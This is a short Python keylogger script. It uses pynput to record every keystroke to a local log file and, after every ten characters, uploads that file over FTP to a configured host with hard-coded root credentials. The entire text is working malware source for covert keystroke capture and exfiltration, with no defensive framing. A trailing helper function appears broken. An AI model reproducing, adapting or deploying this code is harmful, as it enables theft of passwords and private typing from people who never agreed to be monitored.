from pynput import keyboard
import logging
import ftplib
import os

log_file = "keylog.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')

key_press_data = ""
print("Logging:")

def on_press(key):
    global key_press_data
    try: 
        key_press_data += key.char
        if(len(key_press_data) == 10):
            logging.info('String: {0}'.format(key_press_data))
            key_press_data=""
            file = "keylog.log"
            print("Storing Data...")
            ftp = ftplib.FTP()
            ftp_host = '127.0.0.1'
            ftp_port = 5555
            ftp.connect(ftp_host,ftp_port)
            ftp.login("root", "root")
            ftp.storlines("STOR " + file, open(file))
            print("Transfer Done")
        logging.info('Key {0} pressed'.format(key.char))
    except:
        logging.info('special key {0} pressed'.format(key))


        
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def sendFile():
    print("called")
    file = "keylog.log"
    ftp = ftplib.FTP("ftp://127.0.0.1:5555")
    ftp.login("root", "root")
    ftp.storlines("STOR " + file, open(file))